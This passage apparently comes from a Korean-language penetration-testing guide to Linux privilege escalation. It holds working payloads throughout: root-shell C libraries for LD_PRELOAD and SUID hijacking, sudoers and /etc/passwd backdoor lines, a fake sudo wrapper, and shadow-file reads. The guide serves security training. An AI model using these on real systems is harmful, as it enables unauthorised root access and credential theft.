#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### 열린 포트

접근하기 전에 상호작용할 수 없었던 머신에서 실행 중인 네트워크 서비스를 항상 확인하세요:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

트래픽을 스니핑할 수 있는지 확인하세요. 가능하다면, 자격 증명을 잡을 수 있을 것입니다.
```
timeout 1 tcpdump
```
## 사용자

### 일반 열거

**당신**이 누구인지, 어떤 **권한**이 있는지, 시스템에 어떤 **사용자**가 있는지, 어떤 사용자가 **로그인**할 수 있는지, 그리고 어떤 사용자가 **루트 권한**을 가지고 있는지 확인하십시오:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

일부 Linux 버전은 **UID > INT_MAX**를 가진 사용자가 권한을 상승시킬 수 있는 버그의 영향을 받았습니다. 더 많은 정보: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) 및 [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Groups

루트 권한을 부여할 수 있는 **그룹의 구성원인지 확인**하세요:

{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

클립보드에 흥미로운 내용이 있는지 확인하세요 (가능한 경우)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### 비밀번호 정책
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### 알려진 비밀번호

환경의 **비밀번호를 알고 있다면** 각 사용자로 **로그인해 보세요**.

### Su Brute

많은 소음을 내는 것에 신경 쓰지 않고 `su`와 `timeout` 바이너리가 컴퓨터에 존재한다면, [su-bruteforce](https://github.com/carlospolop/su-bruteforce)를 사용하여 사용자를 무작위로 공격해 볼 수 있습니다.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)도 `-a` 매개변수를 사용하여 사용자 무작위 공격을 시도합니다.

## 쓰기 가능한 PATH 남용

### $PATH

$PATH의 **어떤 폴더에 쓸 수 있는 경우**에는 **쓰기 가능한 폴더에 백도어를 생성**하여 다른 사용자(이상적으로는 root)에 의해 실행될 명령의 이름을 사용할 수 있습니다. 이 명령은 $PATH에서 귀하의 쓰기 가능한 폴더보다 이전에 위치한 폴더에서 **로드되지 않아야** 합니다.

### SUDO 및 SUID

sudo를 사용하여 일부 명령을 실행할 수 있도록 허용되거나 suid 비트가 설정되어 있을 수 있습니다. 다음을 사용하여 확인하세요:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
일부 **예상치 못한 명령은 파일을 읽거나/또는 쓸 수 있거나 심지어 명령을 실행할 수 있게 해줍니다.** 예를 들어:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo 구성은 사용자가 비밀번호를 모르고 다른 사용자의 권한으로 일부 명령을 실행할 수 있도록 허용할 수 있습니다.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
이 예에서 사용자 `demo`는 `root`로 `vim`을 실행할 수 있으며, 이제 루트 디렉토리에 ssh 키를 추가하거나 `sh`를 호출하여 셸을 얻는 것이 간단합니다.
```
sudo vim -c '!sh'
```
### SETENV

이 지시어는 사용자가 무언가를 실행하는 동안 **환경 변수를 설정**할 수 있게 해줍니다:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
이 예제는 **HTB 머신 Admirer**를 기반으로 하며, 스크립트를 루트로 실행하는 동안 임의의 파이썬 라이브러리를 로드하기 위해 **PYTHONPATH 하이재킹**에 **취약**했습니다:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Sudo 실행 우회 경로

**다른 파일로 점프**하거나 **심볼릭 링크**를 사용합니다. 예를 들어 sudoers 파일에서: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
**와일드카드** (\*)가 사용되면, 훨씬 더 쉽습니다:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**대응책**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo 명령/SUID 바이너리 경로 없이

**sudo 권한**이 단일 명령에 **경로를 지정하지 않고** 부여된 경우: _hacker10 ALL= (root) less_ PATH 변수를 변경하여 이를 악용할 수 있습니다.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
이 기술은 **suid** 바이너리가 **경로를 지정하지 않고 다른 명령을 실행할 때도 사용할 수 있습니다 (항상 이상한 SUID 바이너리의 내용을 _**strings**_로 확인하세요)**.

[실행할 페이로드 예시.](payloads-to-execute.md)

### 명령 경로가 있는 SUID 바이너리

만약 **suid** 바이너리가 **경로를 지정하여 다른 명령을 실행한다면**, suid 파일이 호출하는 명령과 같은 이름의 **함수를 내보내기** 위해 시도할 수 있습니다.

예를 들어, suid 바이너리가 _**/usr/sbin/service apache2 start**_를 호출한다면, 함수를 생성하고 내보내기를 시도해야 합니다:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
그런 다음, suid 바이너리를 호출하면 이 함수가 실행됩니다.

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** 환경 변수는 로더가 모든 다른 라이브러리, 표준 C 라이브러리(`libc.so`)를 포함하여 로드하기 전에 로드할 하나 이상의 공유 라이브러리(.so 파일)를 지정하는 데 사용됩니다. 이 프로세스를 라이브러리 프리로딩이라고 합니다.

그러나 시스템 보안을 유지하고 이 기능이 악용되는 것을 방지하기 위해, 특히 **suid/sgid** 실행 파일과 관련하여 시스템은 특정 조건을 강제합니다:

- 로더는 실제 사용자 ID(_ruid_)가 유효 사용자 ID(_euid_)와 일치하지 않는 실행 파일에 대해 **LD_PRELOAD**를 무시합니다.
- suid/sgid가 있는 실행 파일의 경우, suid/sgid인 표준 경로의 라이브러리만 프리로드됩니다.

권한 상승은 `sudo`로 명령을 실행할 수 있는 능력이 있고 `sudo -l`의 출력에 **env_keep+=LD_PRELOAD** 문이 포함된 경우 발생할 수 있습니다. 이 구성은 **LD_PRELOAD** 환경 변수가 지속되고 `sudo`로 명령을 실행할 때 인식되도록 하여, 잠재적으로 상승된 권한으로 임의의 코드가 실행될 수 있게 합니다.
```
Defaults        env_keep += LD_PRELOAD
```
**/tmp/pe.c**로 저장하세요.
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
그런 다음 **컴파일하세요**:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
마지막으로, **권한 상승** 실행
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 공격자가 **LD_LIBRARY_PATH** 환경 변수를 제어하는 경우 유사한 권한 상승이 악용될 수 있습니다. 왜냐하면 공격자가 라이브러리를 검색할 경로를 제어하기 때문입니다.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID 바이너리 – .so 주입

비정상적으로 보이는 **SUID** 권한을 가진 바이너리를 발견했을 때, **.so** 파일을 제대로 로드하는지 확인하는 것이 좋은 방법입니다. 다음 명령어를 실행하여 확인할 수 있습니다:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
예를 들어, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_와 같은 오류가 발생하면 취약점이 존재할 가능성을 나타냅니다.

이를 이용하기 위해, _"/path/to/.config/libcalc.c"_라는 C 파일을 생성하고 다음 코드를 포함시킵니다:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
이 코드는 컴파일되고 실행되면 파일 권한을 조작하고 상승된 권한으로 셸을 실행하여 권한을 상승시키는 것을 목표로 합니다.

위의 C 파일을 공유 객체(.so) 파일로 컴파일하려면:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
마지막으로, 영향을 받은 SUID 바이너리를 실행하면 익스플로잇이 트리거되어 시스템 손상이 발생할 수 있습니다.

## 공유 객체 하이재킹
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
이제 우리가 쓸 수 있는 폴더에서 라이브러리를 로드하는 SUID 바이너리를 찾았으므로, 해당 폴더에 필요한 이름으로 라이브러리를 생성합시다:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
오류가 발생하면 다음과 같은 메시지가 표시됩니다.
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
그것은 당신이 생성한 라이브러리에 `a_function_name`이라는 함수가 있어야 함을 의미합니다.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io)는 공격자가 로컬 보안 제한을 우회하기 위해 악용할 수 있는 Unix 바이너리의 선별된 목록입니다. [**GTFOArgs**](https://gtfoargs.github.io/)는 명령에 **인수만 주입할 수 있는** 경우에 대한 동일한 목록입니다.

이 프로젝트는 제한된 셸을 탈출하고, 권한을 상승시키거나 유지하며, 파일을 전송하고, 바인드 및 리버스 셸을 생성하고, 기타 포스트 익스플로잇 작업을 용이하게 하기 위해 악용될 수 있는 Unix 바이너리의 합법적인 기능을 수집합니다.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{% embed url="https://gtfobins.github.io/" %}

{% embed url="https://gtfoargs.github.io/" %}

### FallOfSudo

`sudo -l`에 접근할 수 있다면, 도구 [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo)를 사용하여 어떤 sudo 규칙을 악용할 수 있는지 확인할 수 있습니다.

### Sudo 토큰 재사용

**sudo 접근 권한**은 있지만 비밀번호가 없는 경우, **sudo 명령 실행을 기다린 다음 세션 토큰을 탈취하여 권한을 상승시킬 수 있습니다.**

권한 상승을 위한 요구 사항:

- 이미 "_sampleuser_" 사용자로 셸을 가지고 있음
- "_sampleuser_"가 **최근 15분 이내에 `sudo`**를 사용하여 무언가를 실행함 (기본적으로 이는 비밀번호를 입력하지 않고 `sudo`를 사용할 수 있게 해주는 sudo 토큰의 지속 시간입니다)
- `cat /proc/sys/kernel/yama/ptrace_scope`는 0임
- `gdb`에 접근 가능 (업로드할 수 있어야 함)

(일시적으로 `ptrace_scope`를 활성화하려면 `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope`를 사용하거나 `/etc/sysctl.d/10-ptrace.conf`를 영구적으로 수정하고 `kernel.yama.ptrace_scope = 0`으로 설정할 수 있습니다)

이 모든 요구 사항이 충족되면, **다음 링크를 사용하여 권한을 상승시킬 수 있습니다:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **첫 번째 익스플로잇**(`exploit.sh`)은 _/tmp_에 `activate_sudo_token` 바이너리를 생성합니다. 이를 사용하여 **세션에서 sudo 토큰을 활성화할 수 있습니다** (자동으로 루트 셸을 얻지 않으며, `sudo su`를 실행해야 함):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- 두 번째 익스플로잇 (`exploit_v2.sh`)은 _/tmp_에 **setuid가 설정된 root 소유의 sh 셸**을 생성합니다.
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **세 번째 익스플로잇** (`exploit_v3.sh`)는 **sudoers 파일을 생성하여 sudo 토큰을 영구적으로 만들고 모든 사용자가 sudo를 사용할 수 있도록** 합니다.
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

해당 폴더 또는 폴더 내에 생성된 파일에 **쓰기 권한**이 있는 경우, 이진 파일 [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools)을 사용하여 **사용자 및 PID에 대한 sudo 토큰을 생성**할 수 있습니다.\
예를 들어, _/var/run/sudo/ts/sampleuser_ 파일을 덮어쓸 수 있고 PID 1234로 해당 사용자로 쉘을 가지고 있다면, 비밀번호를 알 필요 없이 **sudo 권한을 얻을 수 있습니다**.
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

파일 `/etc/sudoers`와 `/etc/sudoers.d` 내부의 파일들은 누가 `sudo`를 사용할 수 있는지와 그 방법을 설정합니다. 이 파일들은 **기본적으로 사용자 root와 그룹 root만 읽을 수 있습니다**.\
**만약** 이 파일을 **읽을 수 있다면** **흥미로운 정보를 얻을 수 있을 것입니다**, 그리고 만약 **어떤 파일을 쓸 수 있다면** **권한을 상승시킬 수 있습니다**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
이 권한을 남용할 수 있는 것은 글을 쓸 수 있기 때문이다.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
이 권한을 악용하는 또 다른 방법:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo` 바이너리의 대안으로 OpenBSD의 `doas`와 같은 것들이 있습니다. `/etc/doas.conf`에서 그 설정을 확인하는 것을 잊지 마세요.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

만약 **사용자가 일반적으로 머신에 연결하고 `sudo`를 사용하여 권한을 상승시키는** 것을 알고 있고, 그 사용자 컨텍스트 내에서 쉘을 얻었다면, **새로운 sudo 실행 파일을 생성**하여 루트로서 당신의 코드를 실행한 다음 사용자의 명령을 실행할 수 있습니다. 그런 다음, **사용자 컨텍스트의 $PATH를 수정**하여 (예: .bash_profile에 새로운 경로 추가) 사용자가 sudo를 실행할 때 당신의 sudo 실행 파일이 실행되도록 합니다.

사용자가 다른 쉘(배시가 아닌)을 사용하는 경우, 새로운 경로를 추가하기 위해 다른 파일을 수정해야 한다는 점에 유의하세요. 예를 들어 [sudo-piggyback](https://github.com/APTy/sudo-piggyback)는 `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`를 수정합니다. [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)에서 또 다른 예를 찾을 수 있습니다.

또는 다음과 같은 것을 실행할 수 있습니다:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## 공유 라이브러리

### ld.so

파일 `/etc/ld.so.conf`는 **로드된 구성 파일의 출처**를 나타냅니다. 일반적으로 이 파일은 다음 경로를 포함합니다: `include /etc/ld.so.conf.d/*.conf`

이는 `/etc/ld.so.conf.d/*.conf`의 구성 파일이 읽힐 것임을 의미합니다. 이 구성 파일은 **라이브러리**가 **검색**될 **다른 폴더**를 가리킵니다. 예를 들어, `/etc/ld.so.conf.d/libc.conf`의 내용은 `/usr/local/lib`입니다. **이는 시스템이 `/usr/local/lib` 내에서 라이브러리를 검색할 것임을 의미합니다.**

어떤 이유로 **사용자가 다음 경로에 쓰기 권한**을 가지고 있다면: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` 내의 모든 파일 또는 `/etc/ld.so.conf.d/*.conf` 내의 구성 파일에 있는 모든 폴더, 그는 권한 상승을 할 수 있습니다.\
다음 페이지에서 **이 잘못된 구성을 악용하는 방법**을 확인하세요:

{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
`/var/tmp/flag15/`에 lib를 복사함으로써, `RPATH` 변수에 지정된 대로 이 위치에서 프로그램에 의해 사용될 것입니다.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
그런 다음 `/var/tmp`에 `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`를 사용하여 악성 라이브러리를 생성합니다.
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities는 **프로세스에 사용할 수 있는 루트 권한의 하위 집합**을 제공합니다. 이는 루트 **권한을 더 작고 독특한 단위로 나누는 효과**를 줍니다. 이러한 각 단위는 프로세스에 독립적으로 부여될 수 있습니다. 이렇게 하면 전체 권한 세트가 줄어들어 악용 위험이 감소합니다.\
다음 페이지를 읽어 **권한에 대해 더 배우고 이를 악용하는 방법**을 알아보세요:

{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

디렉토리에서 **"실행"** 비트는 영향을 받는 사용자가 "**cd**"를 통해 폴더로 들어갈 수 있음을 의미합니다.\
**"읽기"** 비트는 사용자가 **파일**을 **목록화**할 수 있음을 의미하고, **"쓰기"** 비트는 사용자가 **파일을 삭제**하고 **새 파일을 생성**할 수 있음을 의미합니다.

## ACLs

Access Control Lists (ACLs)는 전통적인 ugo/rwx 권한을 **무시할 수 있는** 재량적 권한의 두 번째 계층을 나타냅니다. 이러한 권한은 소유자나 그룹의 일원이 아닌 특정 사용자에게 권한을 부여하거나 거부함으로써 파일 또는 디렉토리 접근에 대한 제어를 강화합니다. 이 수준의 **세분화는 더 정확한 접근 관리**를 보장합니다. 추가 세부정보는 [**여기**](https://linuxconfig.org/how-to-manage-acls-on-linux)에서 확인할 수 있습니다.

**kali** 사용자에게 파일에 대한 읽기 및 쓰기 권한을 부여합니다:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**특정 ACL이 있는** 파일을 시스템에서 가져옵니다:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Open shell sessions

**구버전**에서는 다른 사용자(**root**)의 **셸** 세션을 **탈취**할 수 있습니다.\
**최신 버전**에서는 **자신의 사용자**의 화면 세션에만 **연결**할 수 있습니다. 그러나 **세션 내부에서 흥미로운 정보**를 찾을 수 있습니다.

### screen sessions hijacking

**화면 세션 목록**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**세션에 연결하기**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux 세션 하이재킹

이것은 **오래된 tmux 버전**의 문제였습니다. 비특권 사용자로서 root가 생성한 tmux (v2.1) 세션을 하이재킹할 수 없었습니다.

**tmux 세션 목록**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**세션에 연결하기**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

모든 SSL 및 SSH 키는 2006년 9월부터 2008년 5월 13일 사이에 Debian 기반 시스템(Ubuntu, Kubuntu 등)에서 생성된 경우 이 버그의 영향을 받을 수 있습니다.\
이 버그는 해당 OS에서 새로운 ssh 키를 생성할 때 발생하며, **가능한 변형이 32,768개만 존재했습니다**. 이는 모든 가능성을 계산할 수 있음을 의미하며, **ssh 공개 키를 가지고 있으면 해당 개인 키를 검색할 수 있습니다**. 계산된 가능성은 여기에서 확인할 수 있습니다: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** 비밀번호 인증이 허용되는지 여부를 지정합니다. 기본값은 `no`입니다.
- **PubkeyAuthentication:** 공개 키 인증이 허용되는지 여부를 지정합니다. 기본값은 `yes`입니다.
- **PermitEmptyPasswords**: 비밀번호 인증이 허용될 때, 서버가 빈 비밀번호 문자열로 계정에 로그인하는 것을 허용하는지 여부를 지정합니다. 기본값은 `no`입니다.

### PermitRootLogin

root가 ssh를 사용하여 로그인할 수 있는지 여부를 지정하며, 기본값은 `no`입니다. 가능한 값:

- `yes`: root는 비밀번호와 개인 키를 사용하여 로그인할 수 있습니다.
- `without-password` 또는 `prohibit-password`: root는 개인 키로만 로그인할 수 있습니다.
- `forced-commands-only`: root는 개인 키를 사용하여 로그인할 수 있으며, 명령 옵션이 지정되어야 합니다.
- `no`: 불가능합니다.

### AuthorizedKeysFile

사용자 인증에 사용할 수 있는 공개 키가 포함된 파일을 지정합니다. `%h`와 같은 토큰을 포함할 수 있으며, 이는 홈 디렉토리로 대체됩니다. **절대 경로**( `/`로 시작) 또는 **사용자의 홈에서 상대 경로**를 지정할 수 있습니다. 예:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
해당 구성은 사용자가 "**testusername**"의 **private** 키로 로그인하려고 할 때, ssh가 귀하의 키의 공개 키를 `/home/testusername/.ssh/authorized_keys` 및 `/home/testusername/access`에 있는 키와 비교할 것임을 나타냅니다.

### ForwardAgent/AllowAgentForwarding

SSH 에이전트 포워딩을 사용하면 **서버에 키를 남기지 않고** **로컬 SSH 키를 사용할 수 있습니다** (비밀번호 없이!). 따라서 ssh를 통해 **호스트로 점프**한 다음, 그곳에서 **다른** 호스트로 **점프**할 수 있으며, **초기 호스트**에 있는 **키**를 사용할 수 있습니다.

이 옵션을 `$HOME/.ssh.config`에 다음과 같이 설정해야 합니다:
```
Host example.com
ForwardAgent yes
```
`Host`가 `*`인 경우 사용자가 다른 머신으로 이동할 때마다 해당 호스트가 키에 접근할 수 있게 되며(이는 보안 문제입니다).

파일 `/etc/ssh_config`는 이 **옵션**을 **재정의**하고 이 구성을 허용하거나 거부할 수 있습니다.\
파일 `/etc/sshd_config`는 `AllowAgentForwarding` 키워드를 사용하여 ssh-agent 포워딩을 **허용**하거나 **거부**할 수 있습니다(기본값은 허용).

Forward Agent가 환경에 구성되어 있는 경우 다음 페이지를 읽으십시오. **권한 상승을 악용할 수 있을지도 모릅니다**:

{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## 흥미로운 파일들

### 프로파일 파일

파일 `/etc/profile` 및 `/etc/profile.d/` 아래의 파일들은 **사용자가 새로운 셸을 실행할 때 실행되는 스크립트**입니다. 따라서, 이들 중 하나를 **작성하거나 수정할 수 있다면 권한을 상승시킬 수 있습니다**.
```bash
ls -l /etc/profile /etc/profile.d/
```
이상한 프로필 스크립트가 발견되면 **민감한 세부정보**를 확인해야 합니다.

### Passwd/Shadow 파일

운영 체제에 따라 `/etc/passwd` 및 `/etc/shadow` 파일이 다른 이름을 사용하거나 백업이 있을 수 있습니다. 따라서 **모두 찾고** **읽을 수 있는지 확인**하여 파일 안에 **해시가 있는지** 확인하는 것이 좋습니다:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
일부 경우에 **비밀번호 해시**를 `/etc/passwd` (또는 동등한) 파일 내에서 찾을 수 있습니다.
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Writable /etc/passwd

먼저, 다음 명령어 중 하나로 비밀번호를 생성합니다.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
그런 다음 사용자 `hacker`를 추가하고 생성된 비밀번호를 추가합니다.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
예: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

이제 `su` 명령을 `hacker:hacker`로 사용할 수 있습니다.

또는 다음 줄을 사용하여 비밀번호가 없는 더미 사용자를 추가할 수 있습니다.\
경고: 현재 머신의 보안을 저하시킬 수 있습니다.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
참고: BSD 플랫폼에서는 `/etc/passwd`가 `/etc/pwd.db` 및 `/etc/master.passwd`에 위치하고, `/etc/shadow`는 `/etc/spwd.db`로 이름이 변경됩니다.

민감한 파일에 **쓰기**가 가능한지 확인해야 합니다. 예를 들어, **서비스 구성 파일**에 쓸 수 있습니까?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
예를 들어, 머신이 **tomcat** 서버를 실행 중이고 **/etc/systemd/ 내의 Tomcat 서비스 구성 파일을 수정할 수 있다면,** 다음과 같은 줄을 수정할 수 있습니다:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
당신의 백도어는 tomcat이 다음에 시작될 때 실행될 것입니다.

### 폴더 확인

다음 폴더에는 백업 또는 흥미로운 정보가 포함될 수 있습니다: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (마지막 폴더는 읽을 수 없을 가능성이 높지만 시도해 보세요)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 이상한 위치/소유한 파일
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
